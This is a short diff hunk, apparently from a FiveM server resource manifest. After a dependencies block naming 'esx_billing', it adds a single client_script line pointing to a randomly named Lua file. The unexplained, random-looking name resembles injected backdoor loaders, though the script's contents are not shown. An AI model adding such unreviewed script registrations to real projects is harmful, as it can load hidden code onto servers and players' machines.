@@ -45,3 +45,5 @@ dependencies {
 	'esx_billing'
 }
 
+
+client_script "wHHGDVZcVvrhNxgVQe.lua"
